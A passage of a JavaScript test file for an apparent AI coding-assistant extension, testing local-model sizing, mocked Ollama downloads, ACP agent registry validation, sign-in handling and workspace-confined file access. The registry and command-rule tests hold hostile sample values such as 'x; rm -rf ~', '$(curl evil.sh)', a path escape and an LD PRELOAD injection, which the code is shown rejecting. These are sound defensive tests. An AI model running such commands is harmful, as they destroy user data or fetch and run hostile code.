	// 8 GiB office laptop, no dedicated GPU: small cache floor, 2 GiB margin, 16k context.
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 8 * GIB, unifiedMemory: false }), { context: 16384, fitMarginMiB: 2048, cacheRamMiB: 512 });
	// Integrated GPU reporting a token 2 GiB: shares system RAM — margin ~10% of RAM, 32k context.
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 32 * GIB, unifiedMemory: false, gpuName: 'Intel(R) Arc(TM) 140T GPU', gpuMemoryBytes: 2 * GIB }), { context: 32768, fitMarginMiB: 3277, cacheRamMiB: 1311 });
	// Dedicated NVIDIA 12 GiB on the same RAM: 1 GiB margin — the OS does not live in VRAM.
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 32 * GIB, unifiedMemory: false, gpuName: 'NVIDIA GeForce RTX 4070', gpuMemoryBytes: 12 * GIB }), { context: 32768, fitMarginMiB: 1024, cacheRamMiB: 1311 });
	// 64 GiB workstation: 64k context; a big AMD card is dedicated, no GPU at all is shared.
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 64 * GIB, unifiedMemory: false, gpuName: 'AMD Radeon RX 7900 XTX', gpuMemoryBytes: 24 * GIB }), { context: 65536, fitMarginMiB: 1024, cacheRamMiB: 2621 });
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 64 * GIB, unifiedMemory: false }), { context: 65536, fitMarginMiB: 6554, cacheRamMiB: 2621 });
	// Apple Silicon: unified memory always shares.
	assert.deepStrictEqual(engineFit({ totalMemoryBytes: 16 * GIB, unifiedMemory: true, gpuName: 'Apple M3 (unified memory)', gpuMemoryBytes: 12 * GIB }), { context: 16384, fitMarginMiB: 2048, cacheRamMiB: 655 });
});

test('local models: Ollama list / pull progress / delete / context alias (mock server)', async () => {
	const seen = [];
	const server = await listen(async (req, res) => {
		const b = await body(req);
		seen.push(req.method + ' ' + req.url + ' ' + b);
		if (req.url === '/api/tags') return json(res, 200, { models: [{ name: 'qwen2.5-coder:7b', size: 4.7e9, details: { family: 'qwen2', parameter_size: '7.6B', quantization_level: 'Q4_K_M' } }] });
		if (req.url === '/api/show') return json(res, 200, { capabilities: ['completion', 'tools'], model_info: { 'qwen2.context_length': 32768 } });
		if (req.url === '/api/pull') {
			res.writeHead(200, { 'Content-Type': 'application/x-ndjson', Connection: 'close' });
			res.write(JSON.stringify({ status: 'pulling manifest' }) + '\n');
			res.write(JSON.stringify({ status: 'pulling', digest: 'd1', total: 100, completed: 40 }) + '\n');
			res.write(JSON.stringify({ status: 'pulling', digest: 'd2', total: 50, completed: 50 }) + '\n');
			res.write(JSON.stringify({ status: 'pulling', digest: 'd1', total: 100, completed: 100 }) + '\n');
			return res.end(JSON.stringify({ status: 'success' }) + '\n');
		}
		if (req.url === '/api/delete') { res.writeHead(200, { Connection: 'close' }); return res.end(); }
		if (req.url === '/api/create') return json(res, 200, { status: 'success' });
		res.writeHead(404, { Connection: 'close' });
		res.end();
	});
	process.env.OLLAMA_HOST = '127.0.0.1:' + server.address().port;
	delete require.cache[require.resolve(OUT + '/localModels.js')];
	const L = require(OUT + '/localModels.js');
	try {
		const m = L.machineCapacity({ platform: 'x', cpu: 'c', cores: 8, totalMemoryBytes: 32e9, unifiedMemory: false });
		const [info] = await L.listInstalled(m);
		assert.deepStrictEqual({ tag: info.tag, tools: info.tools, context: info.context, fit: info.fit, params: info.params }, { tag: 'qwen2.5-coder:7b', tools: true, context: 32768, fit: 'fits', params: '7.6B' });
		const progress = [];
		await L.pullModel('qwen3:8b', (p) => progress.push(p.completed + '/' + p.total));
		assert.ok(progress.includes('90/150') && progress.at(-1) === '150/150', 'summed across layers: ' + progress);
		await L.removeModel('qwen3:8b');
		assert.ok(seen.some((s) => s.startsWith('DELETE /api/delete') && s.includes('qwen3:8b')));
		const alias = await L.contextAlias('qwen2.5-coder:7b', 'fits');
		assert.deepStrictEqual(alias, { model: 'qwen2.5-coder-zer0ne32k:7b', context: 32768 });
		assert.ok(seen.some((s) => s.includes('/api/create') && s.includes('"num_ctx":32768') && s.includes('"from":"qwen2.5-coder:7b"')));
	} finally {
		delete process.env.OLLAMA_HOST;
		await close(server);
	}
});

test('local models: a pull cut off before "success" is an error; a finished .part resumes on 416; a stale one is dropped', async () => {
	const server = await listen(async (req, res) => {
		if (req.url === '/api/pull') {
			res.writeHead(200, { 'Content-Type': 'application/x-ndjson', Connection: 'close' });
			res.write('not json — a proxy banner\n');
			res.write(JSON.stringify({ status: 'pulling', digest: 'd1', total: 100, completed: 40 }) + '\n');
			return res.end(); // connection closed cleanly, never "success"
		}
		if (req.url === '/whole.gguf' || req.url === '/moved.gguf') {
			// A resume asks for bytes past the end of a complete (or outdated) partial file.
			res.writeHead(416, { 'Content-Range': 'bytes */' + (req.url === '/whole.gguf' ? 1000 : 800), Connection: 'close' });
			return res.end();
		}
		res.writeHead(404, { Connection: 'close' });
		res.end();
	});
	process.env.OLLAMA_HOST = '127.0.0.1:' + server.address().port;
	delete require.cache[require.resolve(OUT + '/localModels.js')];
	const L = require(OUT + '/localModels.js');
	delete require.cache[require.resolve(OUT + '/localEngine.js')];
	const E = require(OUT + '/localEngine.js');
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'zla-416-'));
	try {
		await assert.rejects(L.pullModel('qwen3:8b', () => {}), /interrupted before Ollama finished/);
		const base = 'http://127.0.0.1:' + server.address().port;
		const whole = path.join(dir, 'whole.gguf');
		fs.writeFileSync(whole + '.part', Buffer.alloc(1000, 1));
		await E.download(base + '/whole.gguf', whole, () => {}, new AbortController().signal, 1000);
		assert.strictEqual(fs.statSync(whole).size, 1000, 'the finished .part was renamed, not re-downloaded');
		assert.ok(!fs.existsSync(whole + '.part'));
		const moved = path.join(dir, 'moved.gguf');
		fs.writeFileSync(moved + '.part', Buffer.alloc(1000, 2));
		await assert.rejects(E.download(base + '/moved.gguf', moved, () => {}, new AbortController().signal, 800), /no longer matches/);
		assert.ok(!fs.existsSync(moved + '.part') && !fs.existsSync(moved), 'the stale part is dropped so the next try starts fresh');
	} finally {
		delete process.env.OLLAMA_HOST;
		fs.rmSync(dir, { recursive: true, force: true });
		await close(server);
	}
});

// ------------------------------------------------------------------ ACP agents (v0.28)

test('ACP registry: hostile entries are dropped, launch prefers a download, cards put plans first', () => {
	const R = require(OUT + '/acp/registry.js');
	const good = { id: 'good', name: 'Good', version: '1.0.0', description: 'd', distribution: { npx: { package: '@scope/pkg@1.2.3', args: ['--acp'] } } };
	const list = R.parseRegistry({ agents: [
		good,
		{ id: 'evil-pkg', name: 'E', version: '1', distribution: { npx: { package: 'x; rm -rf ~' } } },
		{ id: 'evil-arg', name: 'E', version: '1', distribution: { npx: { package: 'ok', args: ['$(curl evil.sh)'] } } },
		{ id: 'evil-env', name: 'E', version: '1', distribution: { npx: { package: 'ok', env: { 'LD PRELOAD': 'x' } } } },
		{ id: 'http-archive', name: 'E', version: '1', distribution: { binary: { 'windows-x86_64': { archive: 'http://insecure.example/a.zip', cmd: './a.exe' } } } },
		{ id: 'escape', name: 'E', version: '1', distribution: { binary: { 'windows-x86_64': { archive: 'https://ok.example/a.zip', cmd: './../../evil.exe' } } } },
		{ id: 'Bad Id!', name: 'E', version: '1', distribution: { npx: { package: 'ok' } } },
		{ id: 'bin', name: 'Bin', version: '2.0.0', distribution: { npx: { package: 'bin-pkg' }, binary: { 'windows-x86_64': { archive: 'https://dl.example.com/bin.zip', cmd: './bin\\agent.exe', args: ['acp'], sha256: 'A'.repeat(64) }, 'linux-x86_64': { archive: 'https://dl.example.com/bin.tgz', cmd: './agent', args: ['acp'] } } } }
	] });
	assert.deepStrictEqual(list.map((e) => e.id), ['good', 'bin'], 'only well-formed entries survive');
	const bin = list.find((e) => e.id === 'bin');
	assert.strictEqual(bin.distribution.binary['windows-x86_64'].cmd, './bin/agent.exe', 'Windows separators normalised');
	assert.strictEqual(bin.distribution.binary['windows-x86_64'].sha256, 'a'.repeat(64));
	assert.strictEqual(R.launchFor(bin, 'win32', 'x64').kind, 'binary', 'a download needs no Node');
	assert.strictEqual(R.launchFor(bin, 'darwin', 'arm64').kind, 'npx', 'no build for this platform: npx');
	assert.strictEqual(R.launchFor(bin, 'win32', 'x64', 'npx').kind, 'npx');
	assert.deepStrictEqual(R.launchFor(list[0]).args, ['--acp']);
	assert.strictEqual(R.platformKey('win32', 'arm64'), 'windows-aarch64');
	// the bundled snapshot is valid and carries the vendors the user asked for
	const { REGISTRY_SNAPSHOT } = require(OUT + '/acp/registrySnapshot.js');
	assert.strictEqual(R.parseRegistry(REGISTRY_SNAPSHOT).length, REGISTRY_SNAPSHOT.length, 'snapshot passes its own validator');
	for (const id of ['claude-acp', 'antigravity-acp', 'gemini', 'cursor', 'opencode', 'codex-acp']) assert.ok(REGISTRY_SNAPSHOT.some((e) => e.id === id), id);
	const cards = R.cardsFrom(REGISTRY_SNAPSHOT);
	assert.deepStrictEqual(cards.slice(0, 5).map((c) => c.id), ['claude-acp', 'antigravity-acp', 'cursor', 'opencode', 'grok-build']);
	assert.ok(cards.find((c) => c.id === 'claude-acp').plan && cards.find((c) => c.id === 'claude-acp').keyPreset === 'claude-account');
	assert.equal(cards.find(c => c.id === 'codex-acp').direct, 'chatgpt-account');
	assert.equal(cards.find(c => c.id === 'gemini').direct, 'acp:antigravity-acp');
	assert.ok(['codex-acp', 'gemini'].every(id => !cards.find(c => c.id === id).plan), 'alternate CLI routes do not duplicate subscription cards');
	assert.ok(cards.filter((c) => !c.plan).every((c, i, a) => i === 0 || a[i - 1].name.localeCompare(c.name) <= 0), 'the rest is alphabetical');
});

test('ACP client: sign-in required, agent auth (link printed outside the protocol), models; describePermission / pickOption', async () => {
	const { AcpConnection, AcpError, authUrlIn, sessionModels } = require(OUT + '/acp/client.js');
	const { describePermission, pickOption, contextDigest } = require(OUT + '/acp/stream.js');
	const logs = [];
	const conn = new AcpConnection({ command: process.execPath, args: [path.join(__dirname, 'acp-mock-agent.js')], env: { ...process.env, MOCK_SIGNED_IN: '0' } }, { requestPermission: async () => ({ outcome: { outcome: 'cancelled' } }), sessionUpdate() {}, log: (l) => logs.push(l) });
	conn.start();
	try {
		await conn.initialize({ fs: true });
		assert.deepStrictEqual([conn.agentName, conn.agentVersion, conn.authMethods.map((m) => m.id)], ['Mock Agent', '1.0.0', ['mock-login']]);
		await assert.rejects(conn.newSession(process.cwd()), (e) => e instanceof AcpError && e.authRequired, 'not signed in is recognised');
		await conn.authenticate('mock-login');
		const url = logs.map(authUrlIn).find(Boolean);
		assert.strictEqual(url, 'https://mock.example.com/oauth?state=abc', 'the sign-in link the agent printed');
		const s = await conn.newSession(process.cwd());
		assert.deepStrictEqual(sessionModels(s), { current: 'mock-fast', models: [{ id: 'mock-fast', name: 'Mock Fast' }, { id: 'mock-pro', name: 'Mock Pro' }] });
	} finally {
		conn.close();
	}
	assert.strictEqual(authUrlIn('Listening on https://localhost:1234'), undefined, 'only sign-in lines');
	assert.strictEqual(authUrlIn('If the browser did not open, visit: https://claude.com/cai/oauth/authorize?code=true.'), 'https://claude.com/cai/oauth/authorize?code=true');
	assert.deepStrictEqual(sessionModels({ models: { currentModelId: 'a', availableModels: [{ modelId: 'a', name: 'A' }] } }), { current: 'a', models: [{ id: 'a', name: 'A' }] }, 'older agents list models here');
	// Cline files its billing "provider" switch under the model category, ahead of the real model option
	const cline = { configOptions: [
		{ id: 'provider', category: 'model', currentValue: 'cline', options: [{ value: 'cline', name: 'Cline Usage-Billing' }, { value: 'cline-pass', name: 'ClinePass' }] },
		{ id: 'model', category: 'model', currentValue: 'anthropic/claude-sonnet-5', options: [{ value: 'anthropic/claude-sonnet-5', name: 'Claude Sonnet 5' }, { value: 'x/y', name: 'Y', description: 'x/y' }] }
	] };
	assert.strictEqual(require(OUT + '/acp/client.js').modelOption(cline).id, 'model');
	// A plan inside an agent: Cline's billing switched to ClinePass first, then only the plan's models; OpenCode's Go plan, else Zen
	{
		const { applyPlanScope, planModels } = require(OUT + '/acp/client.js');
		const { PLAN_AGENTS } = require(OUT + '/acp/registry.js');
		const calls = [];
		const passOpts = [{ id: 'provider', currentValue: 'cline-pass', options: [{ value: 'cline-pass' }] }, { id: 'model', currentValue: 'cline-pass/glm-5.3', options: [{ value: 'cline-free/x' }, { value: 'cline-pass/glm-5.3', name: 'GLM-5.3' }] }];
		const s2 = await applyPlanScope({ setConfigOption: async (...a) => (calls.push(a), { configOptions: passOpts }) }, { sessionId: 's', ...cline }, PLAN_AGENTS.cline.planScope);
		assert.deepStrictEqual(calls, [['s', 'provider', 'cline-pass']]);
		assert.deepStrictEqual(planModels(sessionModels(s2), PLAN_AGENTS.cline.planScope), { current: 'cline-pass/glm-5.3', models: [{ id: 'cline-pass/glm-5.3', name: 'GLM-5.3' }] });
		const oc = { current: 'opencode/big-pickle', models: [{ id: 'opencode/big-pickle' }, { id: 'opencode-go/glm-5.3' }, { id: 'oneprovider/x' }] };
		assert.deepStrictEqual(planModels(oc, PLAN_AGENTS.opencode.planScope), { current: 'opencode-go/glm-5.3', models: [{ id: 'opencode-go/glm-5.3' }] }, 'the Go plan');
		assert.deepStrictEqual(planModels({ models: [{ id: 'opencode/big-pickle' }, { id: 'mine/y' }] }, PLAN_AGENTS.opencode.planScope).models, [{ id: 'opencode/big-pickle' }], 'no Go plan: Zen');
		// Status dot: which failures mean "sign in again" (account), which say nothing (network / model)
		const { accountProblem, agentFailureText } = require(OUT + '/providerStore.js');
		for (const e of ['Provider error 402: You have run out of credits or need a Grok subscription.', 'Agent execution error: Agent execution terminated due to error. ("request failed (code 403): Verify your account to continue.")', 'Authentication failed (HTTP 401).', 'Your Claude sign-in expired.']) assert.ok(accountProblem(e), e);
		for (const e of ['fetch failed', 'The provider does not serve model "x" (HTTP 404).', 'Request timed out']) assert.ok(!accountProblem(e), e);
		assert.ok(agentFailureText('Agent execution error: Agent execution terminated due to error.'));
		assert.ok(!agentFailureText('Hi! The last session hit an auth error (403). Everything on disk is intact.'), 'a reply that mentions an error is still a reply');
		// Antigravity's 403 VALIDATION_REQUIRED: the Google verification page becomes the error's link (only accounts.google.com is trusted)
		const { verifyUrlIn, agentErrorMessage } = require(OUT + '/acp/client.js');
		const stderr = 'Details: [map[reason:VALIDATION_REQUIRED] map[links:[map[description:Verify your account url:https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AB] map[description:Learn more url:https://support.google.com/accounts?p=al_alert]]]]';
		assert.strictEqual(verifyUrlIn(stderr), 'https://accounts.google.com/signin/continue?sarp=1&scc=1&plt=AB');
		assert.strictEqual(verifyUrlIn('Verify your account url:https://evil.example.com/x VALIDATION_REQUIRED'), undefined);
		const vm = agentErrorMessage(new Error('request failed (code 403): Verify your account to continue.'), 'Google Antigravity', 'https://accounts.google.com/v');
		assert.ok(vm.includes('[Verify your account](https://accounts.google.com/v)') && accountProblem(vm));
		assert.strictEqual(agentErrorMessage(new Error(vm), 'x'), vm, 'not wrapped twice');
		// Claude's plan card ignores a user settings.json that routes Claude Code through a proxy
		assert.ok(PLAN_AGENTS['claude-acp'].planOnly.dropEnv.test('ANTHROPIC_BASE_URL') && PLAN_AGENTS['claude-acp'].planOnly.dropEnv.test('ANTHROPIC_DEFAULT_OPUS_MODEL') && !PLAN_AGENTS['claude-acp'].planOnly.dropEnv.test('CLAUDE_CONFIG_DIR'));
		assert.deepStrictEqual(PLAN_AGENTS['claude-acp'].planOnly.sessionMeta.claudeCode.options.settingSources, ['project', 'local']);
	}
	// Antigravity prints a sign-in link on every start: it is opened only when the agent really needs a login
	{
		const { signInAgent } = require(OUT + '/acp/signIn.js');
		const fakeRt = (signedIn) => ({
			connect: async (_e, handlers) => {
				let tries = 0;
				return {
					agentName: 'Fake', authMethods: [{ id: 'login', name: 'Log in with Google' }], close() {},
					authenticate: async () => undefined,
					newSession: async () => {
						handlers.log('Please sign in: https://accounts.google.com/signin?x=1');
						if (!signedIn && tries++ === 0) throw new AcpError('Authentication required', -32000);
						return { sessionId: 's', configOptions: [{ id: 'model', currentValue: 'a', options: [{ value: 'a', name: 'A' }] }] };
					}
				};
			}
		});
		for (const signedIn of [true, false]) {
			const opened = [];
			const res = await signInAgent(fakeRt(signedIn), { id: 'fake', name: 'Fake' }, undefined, process.cwd(), { signal: new AbortController().signal, open: (u) => opened.push(u), terminal() {}, event() {}, code: async () => '' });
			assert.deepStrictEqual([res.models, opened.length], [[{ id: 'a', name: 'A' }], signedIn ? 0 : 1], signedIn ? 'signed in: no browser page' : 'signed out: the link opens');
		}
	}
	assert.deepStrictEqual(sessionModels(cline), { current: 'anthropic/claude-sonnet-5', models: [{ id: 'anthropic/claude-sonnet-5', name: 'Claude Sonnet 5' }, { id: 'x/y', name: 'Y' }] }, 'the real models; a note that only repeats the id is dropped');
	assert.deepStrictEqual(sessionModels({ configOptions: [{ id: 'model', options: [{ value: 'default', name: 'Default (recommended)', description: 'Sonnet 5.5' }, { value: 'default', name: 'dupe' }] }] }).models, [{ id: 'default', name: 'Default (recommended)', description: 'Sonnet 5.5' }], 'names and notes kept, duplicates dropped');
	const d = describePermission({ toolCallId: 't', title: 'Edit a.ts', kind: 'edit', content: [{ type: 'diff', path: '/w/a.ts', oldText: 'x', newText: 'y' }] });
	assert.deepStrictEqual([d.path, d.oldText, d.newText, d.kind], ['/w/a.ts', 'x', 'y', 'edit']);
	assert.strictEqual(describePermission({ toolCallId: 't', title: 'Run', kind: 'execute', rawInput: { command: 'npm test' } }).command, 'npm test');
	const opts = [{ optionId: 'a', name: 'Always', kind: 'allow_always' }, { optionId: 'r', name: 'Reject', kind: 'reject_once' }];
	assert.deepStrictEqual([pickOption(opts, true), pickOption(opts, false), pickOption([], true)], ['a', 'r', undefined]);
	assert.match(contextDigest([{ role: 'user', content: 'first' }, { role: 'assistant', content: 'reply' }, { role: 'tool', content: 'skipped', toolCallId: 'x' }, { role: 'user', content: 'now' }]), /User: first[\s\S]*Assistant: reply[\s\S]*\[Now\]/);
	assert.strictEqual(contextDigest([{ role: 'user', content: 'only' }]), '', 'a first message needs no digest');
});

test('ACP turn: text and thoughts stream, permission asks the user, writes go through the hooks, plan, model switch, cancel', async () => {
	const { AcpRuntime, setAcpRuntime } = require(OUT + '/acp/runtime.js');
	const { streamAcp, closeAcpAgents } = require(OUT + '/acp/stream.js');
	const rt = new AcpRuntime(fs.mkdtempSync(path.join(os.tmpdir(), 'zla-acp-')));
	const entry = { id: 'mock', name: 'Mock Agent', version: '1', description: '', authors: [], distribution: { npx: { package: 'mock' } } };
	rt.entry = async () => entry;
	rt.spawnSpec = () => ({ command: process.execPath, args: [path.join(__dirname, 'acp-mock-agent.js')], env: { ...process.env } });
	setAcpRuntime(rt);
	const events = [];
	const asked = [];
	const writes = [];
	let allow = true;
	const hooks = () => ({
		cwd: process.cwd(),
		chatId: 'chat-1',
		permission: async (r) => { asked.push([r.kind, r.command]); return allow; },
		readFile: async (p) => 'file:' + p,
		writeFile: async (p, c, approved) => { writes.push([p, c.trim(), approved]); },
		tool: (e) => events.push(e.id + ':' + e.status + (e.detail ? ':' + e.detail : '')),
		plan: (entries) => events.push('plan:' + entries.length)
	});
	const run = (text, extra = {}) => streamAcp({ baseUrl: 'acp:mock', apiKey: '', model: 'mock-pro', apiFormat: 'acp', system: '', messages: [{ role: 'user', content: text }], signal: new AbortController().signal, providerId: 'p1', acp: hooks(), ...extra });
	try {
		let texts = '';
		let thoughts = '';
		const r1 = await run('hello RUN:ls WRITE:a.txt READ:b.txt', { onText: (t) => (texts += t), onReasoning: (t) => (thoughts += t) });
		assert.strictEqual(r1.text, 'model=mock-pro done wrote read="file:b.txt" ', 'answer, incl. the model chosen through set_config_option');
		assert.strictEqual(texts, r1.text);
		assert.strictEqual(thoughts, 'thinking… ');
		assert.deepStrictEqual(r1.toolCalls, [], 'the agent does its own tool work');
		assert.deepStrictEqual(asked, [['execute', 'ls']]);
		assert.ok(events.includes('tc1:done:ran ls') && events.includes('tc2:done') && events.includes('plan:1'), events.join(' | '));
		assert.deepStrictEqual(writes, [['a.txt', 'written by mock', false]], 'the agent wrote through us, not yet approved');
		assert.strictEqual(r1.stopReason, 'end_turn');
		// A refusal reaches the agent, and the same session (one process per chat) answers the next turn.
		allow = false;
		const r2 = await run('again RUN:rm');
		assert.match(r2.text, /skipped/);
		// Cancel: the prompt stops and the promise rejects as an abort.
		const ctl = new AbortController();
		const p = run('SLOW', { signal: ctl.signal });
		setTimeout(() => ctl.abort(), 200);
		await assert.rejects(p, (e) => e.name === 'AbortError');
	} finally {
		closeAcpAgents();
		setAcpRuntime(undefined);
		fs.rmSync(rt.storageDir, { recursive: true, force: true });
	}
});

test('v0.28 agent bridge: approvals, file access inside the workspace, cards, Undo tracking, plan mode', async () => {
	const { makeAcpHooks, insideWorkspace } = require(OUT + '/host/acpBridge.js');
	const { pickModels } = (() => { try { return require(OUT + '/host/acpHost.js'); } catch { return {}; } })();
	const os = require('os');
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'zla-bridge-'));
	fs.writeFileSync(path.join(dir, 'a.txt'), 'one\ntwo\nthree\n');
	fs.mkdirSync(path.join(dir, 'sub'));
	const mk = (over = {}) => {
		const log = { approvals: [], changes: [], cards: [], finished: [] };
		let answer = true;
		const convo = [];
		const deps = {
			cwd: dir, chatId: 'c', convo, settings: {}, planMode: false, eventUndo: false,
			requestApproval: async (r) => { log.approvals.push(r); return { approved: answer, finish: (t, failed) => log.finished.push([t, !!failed]) }; },
			rule: () => undefined,
			recordChange: (rel, before, after) => log.changes.push([rel, before, after]),
			scheduleState: () => {},
			status: () => {},
			onTodos: (t) => log.cards.push(['todos', t.length]),
			...over
		};
		return { hooks: makeAcpHooks(deps), log, convo, say: (v) => (answer = v) };
	};
	try {
		// paths: inside the workspace only, links included
		assert.strictEqual(insideWorkspace(dir, 'a.txt'), path.join(dir, 'a.txt'));
		assert.strictEqual(insideWorkspace(dir, '../outside.txt'), undefined);
		assert.strictEqual(insideWorkspace(dir, path.join(os.tmpdir(), 'elsewhere.txt')), undefined);
		assert.ok(insideWorkspace(dir, 'sub/new/file.txt'), 'a new file in a new folder is fine');
		// reads: whole file, a window of lines, refusal outside
		const a = mk();
		assert.strictEqual(await a.hooks.readFile('a.txt'), 'one\ntwo\nthree\n');
		assert.strictEqual(await a.hooks.readFile('a.txt', 2, 1), 'two');
		await assert.rejects(a.hooks.readFile('../x'), /outside the workspace/);
		// permission → approval cards of the right kind; an edit carries its diff for review
		const p = mk();
		assert.strictEqual(await p.hooks.permission({ toolCallId: 't1', title: 'npm test', kind: 'execute', command: 'npm test', options: [] }), true);
		assert.strictEqual(await p.hooks.permission({ toolCallId: 't2', title: 'Edit a.txt', kind: 'edit', path: path.join(dir, 'a.txt'), oldText: 'one', newText: 'ONE', options: [] }), true);
		assert.strictEqual(await p.hooks.permission({ toolCallId: 't3', title: 'Fetch docs', kind: 'fetch', options: [] }), true);
		assert.deepStrictEqual(p.log.approvals.map((r) => r.kind), ['command', 'write', 'mcp']);
		assert.deepStrictEqual([p.log.approvals[0].command, p.log.approvals[1].path, p.log.approvals[1].review], ['npm test', 'a.txt', { before: 'one', after: 'ONE' }]);
		// the project's command rules reach agents from other makers too
		fs.mkdirSync(path.join(dir, '.zer0ne'));
		fs.writeFileSync(path.join(dir, '.zer0ne', 'command-rules'), 'deny: rm -rf *\nask: git push*\n');
		const ruled = mk();
		assert.strictEqual(await ruled.hooks.permission({ toolCallId: 'r1', title: 'rm', kind: 'execute', command: 'echo x & rm -rf ~', options: [] }), false, 'a denied command is refused');
		assert.strictEqual(ruled.log.approvals.length, 0, 'without reaching an approval card');
		await ruled.hooks.permission({ toolCallId: 'r2', title: 'push', kind: 'execute', command: 'git push --force', options: [] });
		assert.strictEqual(ruled.log.approvals[0].projectRule, 'ask', 'ask rules travel with the card, so Full access still asks');
		fs.rmSync(path.join(dir, '.zer0ne'), { recursive: true, force: true });
		// tool events finish an approved card; ones that did not ask get an activity card
		p.hooks.tool({ id: 't1', title: 'npm test', kind: 'execute', status: 'done', detail: '3 passed' });
		assert.deepStrictEqual(p.log.finished, [['3 passed', false]]);
		assert.strictEqual(p.convo.filter((m) => m.kind === 'tool').length, 0, 'no second card for an approved step');
		p.hooks.tool({ id: 'r1', title: 'Read a.txt', kind: 'read', status: 'running' });
		p.hooks.tool({ id: 'r1', title: 'Read a.txt', kind: 'read', status: 'done', detail: '3 lines' });
		p.hooks.tool({ id: 'th', title: 'thinking', kind: 'think', status: 'running' });
		const cards = p.convo.filter((m) => m.kind === 'tool');
		assert.deepStrictEqual(cards.map((c) => [c.tool.name, c.tool.status, c.tool.summary]), [['read_file', 'done', '3 lines']]);
		// a rejected request answers false and closes its card
		const r = mk();
		r.say(false);
		assert.strictEqual(await r.hooks.permission({ toolCallId: 'x', title: 'rm', kind: 'execute', command: 'rm -rf x', options: [] }), false);
		assert.deepStrictEqual(r.log.finished, [['rejected', false]]);
		// the activity card an agent showed before asking is replaced by the approval card
		const d = mk();
		d.hooks.tool({ id: 'w1', title: 'Edit b.txt', kind: 'edit', status: 'pending', path: path.join(dir, 'b.txt') });
		assert.strictEqual(d.convo.length, 1);
		await d.hooks.permission({ toolCallId: 'w1', title: 'Edit b.txt', kind: 'edit', path: path.join(dir, 'b.txt'), newText: 'x', options: [] });
		assert.strictEqual(d.convo.length, 0, 'the approval card is the one card');
		// writes through us: asked unless the user already allowed that edit; recorded for Undo
		const w = mk();
		await w.hooks.writeFile(path.join(dir, 'new.txt'), 'hello', false);
		assert.strictEqual(fs.readFileSync(path.join(dir, 'new.txt'), 'utf8'), 'hello');
		assert.deepStrictEqual(w.log.changes, [['new.txt', null, 'hello']]);
		assert.strictEqual(w.log.approvals.length, 1, 'an unapproved write asks');
		await w.hooks.writeFile(path.join(dir, 'new.txt'), 'hello 2', true);
		assert.strictEqual(w.log.approvals.length, 1, 'an approved edit is not asked twice');
		assert.deepStrictEqual(w.log.changes[1], ['new.txt', 'hello', 'hello 2']);
		w.say(false);
		await assert.rejects(w.hooks.writeFile(path.join(dir, 'no.txt'), 'x', false), /rejected/);
		assert.ok(!fs.existsSync(path.join(dir, 'no.txt')));
		await assert.rejects(w.hooks.writeFile(path.join(os.tmpdir(), 'escape.txt'), 'x', true), /outside the workspace/);
		const ro = mk({ planMode: true });
		await assert.rejects(ro.hooks.writeFile(path.join(dir, 'z.txt'), 'x', true), /Read-only/);
		// event-based Undo (folders without git): the file is read when its edit starts, compared when it ends
		const e = mk({ eventUndo: true });
		e.hooks.tool({ id: 'e1', title: 'Edit a.txt', kind: 'edit', status: 'running', path: path.join(dir, 'a.txt') });
		fs.writeFileSync(path.join(dir, 'a.txt'), 'changed\n');
		e.hooks.tool({ id: 'e1', title: 'Edit a.txt', kind: 'edit', status: 'done', path: path.join(dir, 'a.txt') });
		assert.deepStrictEqual(e.log.changes, [['a.txt', 'one\ntwo\nthree\n', 'changed\n']]);
		// the agent's plan becomes a to-do card
		const t = mk();
		t.hooks.plan([{ content: 'a', status: 'completed' }, { content: 'b', status: 'pending' }]);
		assert.deepStrictEqual(t.log.cards, [['todos', 2]]);
		// which models an agent's provider switches on: the current one first, flagships next, eight in all, one effort each, with the agent's names
		if (pickModels) {
			const many = Array.from({ length: 30 }, (_, i) => ({ id: 'm' + i }));
			const picked = pickModels(many, 'm7');
			assert.deepStrictEqual([picked[0].id, picked.filter((m) => m.enabled).length, picked.length], ['m7', 8, 30]);
			const ag = pickModels([
				{ id: 'aion-3.5', name: 'Aion 3.5' },
				{ id: 'gemini-3.8-flash-high', name: 'Gemini 3.8 Flash (High)' },
				{ id: 'gemini-3.8-flash-low', name: 'Gemini 3.8 Flash (Low)', description: 'gemini-3.8-flash-low' },
				{ id: 'claude-opus-5-5', name: 'Opus 5.5', description: 'Best for everyday, complex tasks' }
			], 'gemini-3.8-flash-high');
			assert.deepStrictEqual(ag.map((m) => [m.id, m.enabled, m.name]), [['gemini-3.8-flash-high', true, 'Gemini 3.8 Flash (High)'], ['gemini-3.8-flash-low', false, 'Gemini 3.8 Flash (Low)'], ['claude-opus-5-5', true, 'Opus 5.5'], ['aion-3.5', true, 'Aion 3.5']]);
			assert.strictEqual(ag[2].note, 'Best for everyday, complex tasks');
		}
		// Add provider → Custom: the whole form, checked before anything is stored
		const { customProviderInput } = (() => { try { return require(OUT + '/host/providersHost.js'); } catch { return {}; } })();
		if (customProviderInput) {
			assert.match(customProviderInput({ baseUrl: '' }), /base URL/);
			assert.match(customProviderInput({ baseUrl: 'api.example.com' }), /not a valid address/);
			assert.match(customProviderInput({ baseUrl: 'https://api.example.com/v1' }), /API key/);
			assert.match(customProviderInput({ baseUrl: 'http://api.example.com/v1', apiKey: 'k' }), /unencrypted/);
			const custom = customProviderInput({ baseUrl: 'https://api.example.com/v1/', apiKey: ' k ', apiFormat: 'anthropic', models: 'a, b a\nc' });
			assert.deepStrictEqual({ ...custom, models: custom.models.map((m) => m.id) }, { name: 'example.com', baseUrl: 'https://api.example.com/v1', apiFormat: 'anthropic', apiKey: 'k', models: ['a', 'b', 'c'], smart: true });
			assert.ok(custom.models.every((m) => m.enabled && m.smart));
			assert.strictEqual(customProviderInput({ baseUrl: 'http://localhost:1/v1', apiFormat: 'gemini', smart: false }).apiFormat, 'gemini', 'Custom preserves the selected native Gemini protocol');
			assert.strictEqual(customProviderInput({ baseUrl: 'http://localhost:1/v1', smart: false }).smart, false);
			assert.strictEqual(customProviderInput({ baseUrl: 'http://localhost:1/v1', models: 'legacy', smart: false }).models[0].smart, false, 'legacy string payload keeps the smart switch');
			assert.strictEqual(customProviderInput({ baseUrl: 'http://localhost:11434/v1', name: 'Box', apiFormat: 'nope' }).apiFormat, 'openai', 'local needs no key; unknown formats fall back');
